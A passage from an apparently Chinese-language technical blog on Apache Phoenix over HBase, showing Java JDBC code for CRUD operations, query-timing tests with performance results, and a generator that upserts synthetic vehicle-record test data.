&#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"delete from user where id='001'"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// execute upsert</span></span><br><span class="line">           String msg = ps.executeUpdate() &gt; <span class="number">0</span> ? <span class="string">"delete success..."</span></span><br><span class="line">                  : <span class="string">"delete fail..."</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// you must commit</span></span><br><span class="line">           conn.commit();</span><br><span class="line">           System.out.println(msg);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">drop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"drop table user"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// execute</span></span><br><span class="line">           ps.execute();</span><br><span class="line"></span><br><span class="line">           System.out.println(<span class="string">"drop success..."</span>);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 创角标</span></span><br><span class="line">       create();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 注意更新用的是upsert 插入和更新一样的</span></span><br><span class="line">       upsert();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 查询 查询出结果并打印</span></span><br><span class="line">       query();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 删除表</span></span><br><span class="line"><span class="comment">//       drop();</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本操作和JDBC基本一样，只要在Class里面修改成Phoenix就可以</p><h2 id="无索引简单测试"><a href="#无索引简单测试" class="headerlink" title="无索引简单测试"></a>无索引简单测试</h2><h3 id="首先上结论"><a href="#首先上结论" class="headerlink" title="首先上结论:"></a>首先上结论:</h3><p>针对主键根据单纬度查询,数据量对搜索结果影响非常小,如果仅仅是返回单条结果的查询,能够达到毫秒级反应速度,根据主键批量查询的话速度由表大小和返回数量决定,从目前数据量11亿左右响应速度也在秒级.</p><p>但是如果没有建立索引,想根据非主键查询,反应时间会非常久.</p><h3 id="响应时间测试"><a href="#响应时间测试" class="headerlink" title="响应时间测试"></a>响应时间测试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">       Class.forName(<span class="string">"org.apache.phoenix.jdbc.PhoenixDriver"</span>);</span><br><span class="line"></span><br><span class="line">       String url = <span class="string">"jdbc:phoenix:datanode128:2181"</span>;</span><br><span class="line"></span><br><span class="line">       Connection conn = DriverManager.getConnection(url);</span><br><span class="line"></span><br><span class="line">       Statement statement = conn.createStatement();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">long</span> time = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">       ResultSet rs = statement.executeQuery(<span class="string">"select * from test"</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           String myKey = rs.getString(<span class="string">"MYKEY"</span>);</span><br><span class="line">           String myColumn = rs.getString(<span class="string">"MYCOLUMN"</span>);</span><br><span class="line"></span><br><span class="line">           System.out.println(<span class="string">"myKey="</span> + myKey + <span class="string">"myColumn="</span> + myColumn);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">long</span> timeUsed = System.currentTimeMillis() - time;</span><br><span class="line"></span><br><span class="line">       System.out.println(<span class="string">"time "</span> + timeUsed + <span class="string">"mm"</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 关闭连接</span></span><br><span class="line">       rs.close();</span><br><span class="line">       statement.close();</span><br><span class="line">       conn.close();</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p>120ms</p><p>CREATE TABLE IF NOT EXISTS “employee” (“no” VARCHAR(10) NOT NULL PRIMARY KEY, “company”.”name” VARCHAR(30),”company”.”position” VARCHAR(20), “family”.”tel” VARCHAR(20), “family”.”age” INTEGER);</p><p>csv columns from database. CSV Upsert complete. 1000000 rows upserted </p><p><strong>测试结果：</strong></p><p>100w： insert 70s         count:1.032s     groupby PK: 0.025s </p><p>500w：insert 314s   count:1.246s   groupby PK:0.024s </p><p>从结果看，随着数量级的增加，查询时耗也随之增加，有一个例外，就是当用索引字段为主键时作聚合查询时，用时相差不大。总的来说，Phoenix在用到索引时查询性能会比较好。那对于Count来说，如果不用Phoenix,用HBase自带的Count耗时是怎样的呢，测了一下，HBase Count 100万需要33s, 500万需要139s，性能还是很差的。对于大表来说基本不能用Count来统计行数，还得依赖于基于Coprocessor机制来统计。</p><h2 id="JDBC模拟数据代码"><a href="#JDBC模拟数据代码" class="headerlink" title="JDBC模拟数据代码"></a>JDBC模拟数据代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.RandomUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.time.DateUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">//id，日期,号牌号码，车型，颜色</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BuildData</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> SimpleDateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyyMMddHHmmss"</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] ys = <span class="keyword">new</span> String[] &#123; <span class="string">"红"</span>, <span class="string">"橙"</span>, <span class="string">"黄"</span>, <span class="string">"绿"</span>, <span class="string">"青"</span>, <span class="string">"蓝"</span>, <span class="string">"紫"</span> &#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] cx = <span class="keyword">new</span> String[] &#123; <span class="string">"大众"</span>, <span class="string">"别克"</span>, <span class="string">"奥迪"</span>, <span class="string">"宝马"</span> &#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] zm = <span class="keyword">new</span> String[] &#123; <span class="string">"A"</span>, <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"E"</span>, <span class="string">"F"</span>, <span class="string">"G"</span>, <span class="string">"H"</span>, <span class="string">"I"</span>, <span class="string">"G"</span>, <span class="string">"K"</span>, <span class="string">"L"</span>, <span class="string">"M"</span>, <span class="string">"N"</span>,</span><br><span class="line"><span class="string">"O"</span>, <span class="string">"P"</span>, <span class="string">"Q"</span>, <span class="string">"R"</span>, <span class="string">"S"</span>, <span class="string">"T"</span>, <span class="string">"U"</span>, <span class="string">"V"</span>, <span class="string">"W"</span>, <span class="string">"X"</span>, <span class="string">"Y"</span>, <span class="string">"Z"</span> &#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] zmSz = <span class="keyword">new</span> String[] &#123; <span class="string">"A"</span>, <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"E"</span>, <span class="string">"F"</span>, <span class="string">"G"</span>, <span class="string">"H"</span>, <span class="string">"I"</span>, <span class="string">"G"</span>, <span class="string">"K"</span>, <span class="string">"L"</span>, <span class="string">"M"</span>, <span class="string">"N"</span>,</span><br><span class="line"><span class="string">"O"</span>, <span class="string">"P"</span>, <span class="string">"Q"</span>, <span class="string">"R"</span>, <span class="string">"S"</span>, <span class="string">"T"</span>, <span class="string">"U"</span>, <span class="string">"V"</span>, <span class="string">"W"</span>, <span class="string">"X"</span>, <span class="string">"Y"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>,</span><br><span class="line"><span class="string">"0"</span> &#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String[] prv = <span class="keyword">new</span> String[] &#123; <span class="string">"京"</span>, <span class="string">"津"</span>, <span class="string">"沪"</span>, <span class="string">"渝"</span>, <span class="string">"冀"</span>, <span class="string">"晋"</span>, <span class="string">"辽"</span>, <span class="string">"吉"</span>, <span class="string">"黑"</span>, <span class="string">"苏"</span>, <span class="string">"浙"</span>, <span class="string">"皖"</span>, <span class="string">"闽"</span>, <span class="string">"赣"</span>,</span><br><span class="line"><span class="string">"鲁"</span>, <span class="string">"豫"</span>, <span class="string">"鄂"</span>, <span class="string">"湘"</span>, <span class="string">"粤"</span>, <span class="string">"琼"</span>, <span class="string">"川"</span>, <span class="string">"贵"</span>, <span class="string">"云"</span>, <span class="string">"陕"</span>, <span class="string">"甘"</span>, <span class="string">"青"</span>, <span class="string">"台"</span>, <span class="string">"蒙"</span>, <span class="string">"桂"</span>, <span class="string">"宁"</span>, <span class="string">"新"</span>, <span class="string">"藏"</span>, <span class="string">"港"</span>, <span class="string">"澳"</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Calendar start = Calendar.getInstance();</span><br><span class="line"><span class="keyword">private</span> Calendar end = Calendar.getInstance();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> dayOfSecond = <span class="number">250</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BuildData</span><span class="params">(<span class="keyword">int</span> dayOfSecond, Date start, Date end)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.start.setTime(start);</span><br><span class="line"><span class="keyword">this</span>.end.setTime(end);</span><br><span class="line"><span class="keyword">this</span>.dayOfSecond = dayOfSecond;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成数据</span></span><br><span class="line"><span class="keyword">public</span> String[][] buildData() &#123;</span><br><span class="line"><span class="keyword">if</span> (dayOfSecond &gt; <span class="number">0</span>) &#123;</span><br><span class="line">String date = getDate();</span><br><span class="line"><span class="keyword">if</span> (date == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">String[][] result = <span class="keyword">new</span> String[dayOfSecond][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dayOfSecond; i++) &#123;</span><br><span class="line">result[i][<span class="number">0</span>] = getId();</span><br><span class="line">result[i][<span class="number">1</span>] = date;</span><br><span class="line">result[i][<span class="number">2</span>] = getHphm();</span><br><span class="line">result[i][<span class="number">3</span>] = getCx();</span><br><span class="line">result[i][<span class="number">4</span>] = getYs();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// id</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">String string = UUID.randomUUID().toString().replaceAll(<span class="string">"-"</span>, <span class="string">""</span>);</span><br><span class="line"><span class="keyword">return</span> string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日期</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (end.getTime().getTime() &gt;= start.getTime().getTime()) &#123;</span><br><span class="line">start.setTime(DateUtils.addSeconds(start.getTime(), <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> sdf.format(start.getTime());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 车牌 苏E3G02D</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getHphm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">String p = prv[RandomUtils.nextInt(<span class="number">0</span>, prv.length)];</span><br><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder(p);</span><br><span class="line">sb.append(zm[RandomUtils.nextInt(<span class="number">0</span>, zm.length)]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">sb.append(zmSz[RandomUtils.nextInt(<span class="number">0</span>, zmSz.length)]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 车型</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getCx</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> nextInt = RandomUtils.nextInt(<span class="number">0</span>, cx.length);</span><br><span class="line"><span class="keyword">return</span> cx[nextInt];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 颜色</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getYs</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> nextInt = RandomUtils.nextInt(<span class="number">0</span>, ys.length);</span><br><span class="line"><span class="keyword">return</span> ys[nextInt];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CarVo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String id;</span><br><span class="line"><span class="keyword">private</span> String date;</span><br><span class="line"><span class="keyword">private</span> String hphm;</span><br><span class="line"><span class="keyword">private</span> String cx;</span><br><span class="line"><span class="keyword">private</span> String ys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.id = id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(String date)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.date = date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHphm</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> hphm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHphm</span><span class="params">(String hphm)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.hphm = hphm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getCx</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> cx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCx</span><span class="params">(String cx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.cx = cx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getYs</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ys;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setYs</span><span class="params">(String ys)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.ys = ys;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.QueryRunner;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.time.DateUtils;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InsertData</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Logger log = LoggerFactory.getLogger(InsertData.class);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">args = <span class="keyword">new</span> String[] &#123; <span class="string">"20170103000000"</span>, <span class="string">"20170131000000"</span> &#125;;</span><br><span class="line">Date start = DateUtils.parseDate(args[<span class="number">0</span>], <span class="string">"yyyyMMddHHmmss"</span>);</span><br><span class="line">Date end = DateUtils.parseDate(args[<span class="number">1</span>], <span class="string">"yyyyMMddHHmmss"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Connection connection = <span class="keyword">null</span>;</span><br><span class="line">Class.forName(<span class="string">"org.apache.phoenix.jdbc.PhoenixDriver"</span>);</span><br><span class="line">connection = DriverManager.getConnection(<span class="string">"jdbc:phoenix:172.16.0.128:2181"</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">QueryRunner queryRunner = <span class="keyword">new</span> QueryRunner();</span><br><span class="line"></span><br><span class="line">BuildData buildData = <span class="keyword">new</span> BuildData(<span class="number">250</span>, start, end);</span><br><span class="line">String[][] buildData2 = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> all = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((buildData2 = buildData.buildData()) != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">int</span>[] batch = queryRunner.batch(connection, <span class="string">"upsert into car_test values(?,?,?,?,?)"</span>, buildData2);</span><br><span class="line">num += batch.length;</span><br><span class="line">all += batch.length;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">1000</span>) &#123;</span><br><span class="line"><span class="keyword">long</span> time1 = System.currentTimeMillis();</span><br><span class="line">connection.commit();</span><br><span class="line"><span class="keyword">long</span> time2 = System.currentTimeMillis();</span><br><span class="line">num = <span class="number">0</span>;</span><br><span class="line">System.out.println(<span class="keyword">new</span> Date() + <span class="string">":"</span> + <span class="string">"-start:"</span> + args[<span class="number">0</span>] + <span class="string">"-end:"</span> + args[<span class="number">1</span>] + <span class="string">"--"</span> + all + <span class="string">"--"</span></span><br><span class="line">+ (time2 - time1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// num++;</span></span><br><span class="line"><span class="comment">// all++;</span></span><br><span class="line"><span class="comment">// if (num &gt; 1000) &#123;</span></span><br><span class="line"><span class="comment">// num=0;</span></span><br><span class="line"><span class="comment">// System.out.println(new Date() + ":" + "-start:" + args[0] +</span></span><br><span class="line"><span class="comment">// "-end:" + args[1] + "--" + all);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Phoenix和Spark整合"><a href="#Phoenix和Spark整合" class="headerlink" 